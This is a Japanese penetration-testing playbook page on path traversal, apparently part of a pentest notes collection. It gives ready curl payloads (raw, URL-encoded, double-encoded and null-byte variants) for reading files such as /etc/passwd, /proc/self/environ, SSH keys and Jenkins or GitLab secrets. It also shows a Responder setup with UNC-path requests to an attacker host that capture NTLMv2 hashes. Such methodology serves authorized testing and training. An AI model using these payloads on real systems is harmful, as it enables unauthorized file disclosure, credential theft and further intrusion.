# パストラバーサル（ディレクトリトラバーサル）

## 概要

Webアプリケーションがファイルパスのサニタイズを適切に行っていない場合、`../` 等のシーケンスを使ってWebルート外のファイルを読み取れる。アプリ固有の既知CVEとして公開されているケースも多い。

---

## 着火条件

- Webサービスが動いており、バージョンが特定できた
- そのバージョンにパストラバーサルのCVEが存在する（searchsploit / NVD で確認）
- ファイルダウンロード・プラグイン読み込み・画像表示など、パスを受け取るエンドポイントがある
- **CVE が無くても着火する**：自作スクリプト・カスタム実装で `fopen($_GET['file'])` 系の素朴な実装、リバプロ設定不備（nginx の alias 設定で `/static../` が許される typo 等）、CGI / レガシー framework の独自パス解決でも traversal は発生する。CVE 検索で hit しない場合も「パスを受け取るエンドポイント」全てに対して機械的に `../` を試す価値あり

---

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用Linuxディストリ標準搭載）、`searchsploit`（同左）、ブラウザ（任意）
- インターネットアクセス: NVD / GitHub での CVE 詳細確認時に必要。`searchsploit` 自体はオフラインで動作（事前に `searchsploit -u` でDB更新したものを利用）

---

## 観点・着眼点

バージョンが判明した段階で、**即座にCVEを検索する習慣**をつける。有名なOSSダッシュボード・監視ツール（Grafana, Kibana, Splunk 等）はバージョン依存の既知脆弱性が多い。

パストラバーサルが刺さる場合、最初に確認すべきファイル：

| 確認対象 | パス | 目的 / 注意 |
|---------|------|------|
| OS ユーザー情報 | `/etc/passwd` | ユーザー名・シェルの確認。全ユーザー読み取り可（mode 644） |
| ホスト情報 | `/etc/hosts` | Docker コンテナかどうかの確認 |
| OS バージョン | `/etc/os-release` | 環境把握 |
| Web プロセスの実情報 | `/proc/self/environ` / `/proc/self/cmdline` / `/proc/self/cwd` | プロセスの cwd・環境変数（DB 接続文字列が入っていることが多い） |
| **`/etc/shadow`（ハッシュ）** | `/etc/shadow` | **mode 640 / root:shadow 所有のため一般ユーザー権限の Web プロセス（`www-data` / `nginx` / `apache` 等）では読めない**。LFI が root 権限プロセス（Webサーバを root で起動・古い CGI・misconfigured Docker）に刺さった場合のみ取得可。読めなかった事実が「Web プロセスは非 root」のシグナル |
| Windows ホスト基本情報 | `C:\Windows\win.ini` / `C:\Windows\System32\drivers\etc\hosts` | Windows ホストでの傾向確認（テスト用に使える既知の小さなファイル） |
| アプリの設定ファイル | アプリ依存（後述） | 認証情報・シークレット |
| アプリのデータベース | アプリ依存（後述） | ユーザー・パスワードハッシュ |

**`/etc/hosts` でコンテナか否かを確認する：**
ホスト名がランダムな16進数文字列（例: `172.17.0.2 [CONTAINER_ID]`）であればDockerコンテナ内で動作している。コンテナIDが判明すれば後続の悪用で使える。

---

## 手順

### 基本的なパストラバーサルの試行

```bash
# Linux 系
# シンプルなトラバーサル
curl -v --path-as-is "http://[TARGET]/[ENDPOINT]/../../../etc/passwd"

# エンコードを試みる（WAFがある場合）
curl -v "http://[TARGET]/[ENDPOINT]/..%2F..%2F..%2Fetc%2Fpasswd"

# ダブルエンコード
curl -v "http://[TARGET]/[ENDPOINT]/..%252F..%252F..%252Fetc%252Fpasswd"

# Windows 系
curl -v --path-as-is "http://[TARGET]/[ENDPOINT]/../../../windows/win.ini"
curl -v --path-as-is "http://[TARGET]/[ENDPOINT]/..\..\..\windows\win.ini"   # バックスラッシュ版
```

### Null byte injection（古典手法・現代環境では効きにくい）

```bash
# %00 で拡張子チェックを破る古典手法
curl -v "http://[TARGET]/[ENDPOINT]?file=../../../etc/passwd%00.jpg"
# → アプリが「拡張子が .jpg で終わるか」だけ検証 + C 系 native 層が %00 で文字列終端と解釈する実装でのみ通る
```

> **null byte の効く条件:** PHP は **5.3.4 以降で `%00` を含むファイル名を fopen 等で拒否**するように修正されている（CVE-2006-7243 系の対応）。Java も **JDK 7u40 / JDK 8 以降で `File` クラスに null byte が含まれていると `InvalidPathException`** を投げる。よって PHP 5.3.4 未満 / Java 7 未満 / 独自 C 拡張 / 古いライブラリへの bridge 経路でのみ機能する。試す価値はあるが「古いシステム向けの一手」と認識する。

### Windows 環境 + Java / .NET での UNC パスによる NTLM steal（SSRF 隣接）

ファイル読み込み関数が UNC パス（`\\[ATTACKER_HOST]\share`）を受け入れる Java / .NET / 一部の Windows アプリでは、攻撃者の SMB サーバへの接続を強制でき、**NTLMv2 ハッシュを steal** できる。SMB / WebDAV を listen する必要があるため SSRF 寄りだが、ファイル読み込みエンドポイントで発火する。

```bash
# [Attacker] Responder で NTLMv2 ハッシュを listen
# Responder はペネトレ用 Linux ディストリ標準（要 root）
sudo responder -I [ATTACKER_IFACE]

# [Attacker] ターゲットに UNC パスを送る（パストラバーサルのパラメータに）
curl -v "http://[TARGET]/[ENDPOINT]?file=\\\\[ATTACKER_IP]\\share\\test"
curl -v "http://[TARGET]/[ENDPOINT]?file=//[ATTACKER_IP]/share/test"   # スラッシュ版
```

ハッシュ取得後は `../../05_Tools_Reference/Hashcat.md`（mode 5600）でクラック、または NTLM Relay へ → `../../04_Post_Access_Windows_AD/NTLM_Relay/Responder.md`。

---

## アプリ固有 CVE の具体ペイロード

バージョン特定後に、該当する CVE の具体的なペイロード（プラグイン経由の `../` パス、データベース取得手順等）が必要な場合は CVE_Notes.md を参照する：

- **Grafana 8.0.0〜8.3.0（CVE-2021-43798）** → `../../05_Tools_Reference/CVE_Notes.md`

---

## アプリケーション別の重要ファイルパス

| アプリ | データベース / 設定ファイル |
|-------|--------------------------|
| Grafana | `/var/lib/grafana/grafana.db` （SQLite）, `/etc/grafana/grafana.ini` |
| WordPress | `/var/www/html/wp-config.php` |
| Tomcat | `/opt/tomcat/conf/tomcat-users.xml`、`/opt/tomcat/webapps/[APP]/WEB-INF/web.xml`、`/opt/tomcat/webapps/manager/WEB-INF/web.xml`（manager-script / manager-gui の認証情報経路） |
| Java Web app（汎用） | `WEB-INF/web.xml`（サーブレットマッピング・認証 realm）、`WEB-INF/classes/application.properties` / `.../application.yml`（DB 接続情報）、`WEB-INF/classes/log4j2.xml`（log4j 設定 → JNDI sink 探索の手がかり）、`WEB-INF/lib/*.jar`（ライブラリ列挙 → 既知 CVE 探索） |
| Jenkins | `/var/jenkins_home/secrets/initialAdminPassword`、`/var/jenkins_home/credentials.xml`、`/var/jenkins_home/secrets/master.key` |
| GitLab | `/etc/gitlab/gitlab.rb`、`/var/opt/gitlab/gitlab-rails/etc/secrets.yml` |
| Windows IIS | `C:\inetpub\wwwroot\web.config`、`C:\Windows\System32\inetsrv\config\applicationHost.config` |
| Generic Linux | `/etc/passwd`、`~/.ssh/id_rsa`（ホームディレクトリ・パーミッション要確認）、`~/.bash_history`、`/proc/self/environ`（環境変数：DB 接続文字列・API トークン） |

---

## 刺さらなかったとき

| 症状 | 推定原因 | 次のアクション |
|------|----------|--------------|
| `../` をエンコードなしで送って 400 / 403 | パスのサニタイズあり または WAF の単純パターン検知 | `%2F` / `%252F`（ダブルエンコード）/ `..%c0%af` 等のエンコードバリアントを試す |
| `--path-as-is` なしで送って 200 が返るが `../` が消えている | curl が `../` を正規化している | `curl --path-as-is` を必ず付ける |
| ファイルは読めるが内容が空 | Webアプリのデフォルトディレクトリ・実行 cwd が想定と違う | `curl ... "/proc/self/cwd"` `curl ... "/proc/self/environ"` で実際のパスを特定 |
| 全ての `/etc/passwd` 取得試行が 404 | パストラバーサルではなく特定ディレクトリ配下のみアクセス可（チャートパス制限） | アプリ固有 CVE のペイロード（プラグイン経由パス等）を試す → `../../05_Tools_Reference/CVE_Notes.md` |
| Dockerコンテナ内で `/etc/hosts` がランダム16進ホスト名 | コンテナ内に閉じている | コンテナ内のアプリ設定DB（Grafana等）が次の獲物。ホスト側ファイルは諦める |

---

## 注意点・落とし穴

- `--path-as-is` オプションを使わないと `curl` が `../` を正規化してしまう
- WAFが `../` を検出する場合はエンコード（`%2F`, `%252F`）を試みる
- Dockerコンテナ内でのパストラバーサルはコンテナ内のファイルしか読めない（ホストは不可）
  - ただしコンテナ内のアプリ設定DB（Grafana等）は取得できる
- 取得したファイルが空 or エラーの場合：Webサーバープロセスが動作しているカレントディレクトリを確認する
  `curl ... "/proc/self/cwd"` → Webサーバープロセスの実行ディレクトリへのシンボリックリンクを返す
  `curl ... "/proc/self/environ"` → プロセスの環境変数（パス情報を含む）を返す
  （/proc はLinuxカーネルが仮想的にファイルとして提供する情報領域。プロセスごとのディレクトリが /proc/[PID]/ に存在する）
- 失敗した手法の記録：エンコードなしの `../` のみ試して失敗するケースは多い。必ずエンコードも試す

---

## 関連技術

- 前：バージョン確認・CVE 検索 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：searchsploit でのエクスプロイト検索 → `../../05_Tools_Reference/Searchsploit.md`
- 関連：アプリ × バージョン固有のペイロード集 → `../../05_Tools_Reference/CVE_Notes.md`
- 後：取得したDB/設定ファイルからの認証情報抽出 → `../Credential_Discovery.md`
- 後：Grafana ハッシュのクラック（PBKDF2-HMAC-SHA256） → `../../05_Tools_Reference/Hashcat.md`
- 後（UNC パスで NTLMv2 ハッシュ steal 成立時）：NTLM Relay / クラック → `../../04_Post_Access_Windows_AD/NTLM_Relay/Responder.md`、`../../05_Tools_Reference/Hashcat.md`（mode 5600）
- 関連：「URL を入力してファイルを取得する」系の脆弱性（SSRF と表裏） → `./SSRF.md`
